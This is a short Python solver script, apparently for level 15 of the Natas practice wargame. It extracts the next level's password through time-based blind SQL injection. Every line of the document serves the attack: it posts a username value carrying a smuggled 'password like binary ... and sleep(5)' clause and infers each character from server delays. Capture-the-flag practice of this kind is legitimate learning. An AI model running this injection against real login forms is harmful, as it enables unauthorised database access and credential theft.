import string

import requests

from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 15


def get_secret(debug=False):
    char_list = string.ascii_letters + string.digits
    password = ""
    req = get_request_object(level_number)

    while True:
        if len(password) == password_length:
            return password

        for i in char_list:
            try:
                if debug:
                    print(f"checking: {password}{i}")

                req.post(get_level_url(level_number), timeout=4,
                         data={"username": f"natas16\" and password like binary '{password}{i}%' and sleep(5) #"})
            except requests.Timeout:
                password += i
                break

            # loop ended, but we didn't find new char. :(
            # so we had a timeout cuz of internet connection not mysql sleep.
            # so we will remove last mistaken added char
            if i == "9":
                password = password[:len(password) - 1]


secret = get_secret(debug=True)
store_secret_and_print_message(level_number, secret)